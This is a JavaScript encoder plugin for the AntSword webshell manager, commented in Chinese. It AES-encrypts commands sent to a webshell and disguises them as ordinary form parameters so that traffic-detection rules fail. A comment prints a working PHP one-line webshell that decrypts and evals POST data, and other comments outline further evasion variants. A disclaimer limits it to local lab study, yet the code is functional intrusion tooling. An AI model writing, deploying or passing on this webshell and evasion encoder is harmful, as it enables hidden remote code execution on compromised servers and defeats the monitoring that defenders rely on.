// 蚁剑（AntSword）自定义编码器 demo：流量层魔改（编码器插件机制）
// 放置：蚁剑「编码设置→自定义编码器」；马侧配合一句话型（本地实验环境）
// 声明：仅用于本地实验环境学习对照；demo 密钥为示例值，上线需全量替换。
// 语法：ES5（蚁剑编码器环境兼容——老版 Electron/Node 无模板字符串/箭头函数）
//
// 魔改面：默认编码器（base64/chr 混淆）特征全弃 → AES 自定义编码 + 业务参数伪装
//
// 马侧配合示例（PHP 一句话，需同步实现 AES-128-CBC 解码器）：
//   <?php eval(openssl_decrypt(base64_decode($_POST['token']), 'AES-128-CBC',
//         '0123456789abcdef', OPENSSL_RAW_DATA, base64_decode($_POST['iv']))); ?>
//
// 变体（注释块，本 demo 未启用）：
//   ① 流量转换：编码器内先做格式转换（gzip/自定义字符变换）再投递——不打 AES 直接换
//      流量结构，检测侧"高熵 base64 参数"模型失效；
//   ② 跳密钥交互：密钥不从固定值派生——首包协商或从 URL 业务参数随包携带（服务端
//      自解码器路线，见 NOTES「RSA 模式/自解码器」）——静态密钥面消除。
module.exports = function(pwd, data, ext) {
  var crypto = require('crypto');
  // 密钥派生：demo 固定派生（首包协商可扩展，见上方变体②）
  var key = '0123456789abcdef';
  // 随机 IV：同一命令两次请求密文互异（流量设备"相同密文=重复包"规则失效）；
  // IV 随包以业务参数名（iv）携带，马侧解码器取用
  var iv = crypto.randomBytes(16);
  var cipher = crypto.createCipheriv('aes-128-cbc', key, iv);
  // 载荷组装：连接密码参数名 + 命令（蚁剑编码器契约：data[pwd] 为待加密载荷）
  var payload = pwd + '=' + encodeURIComponent(data[pwd]);
  var enc = Buffer.concat([
    cipher.update(Buffer.from(payload, 'utf8')),
    cipher.final()
  ]).toString('base64');
  // 业务参数伪装：命令藏在业务参数名（token）下，混入正常业务字段
  // （id 稳定设备号 / ts 时间戳 / iv 随包字段）——请求体形状与业务表单同构
  var body = 'id=0123&token=' + enc +
             '&iv=' + iv.toString('base64') +
             '&ts=' + Date.now();
  return body;
};
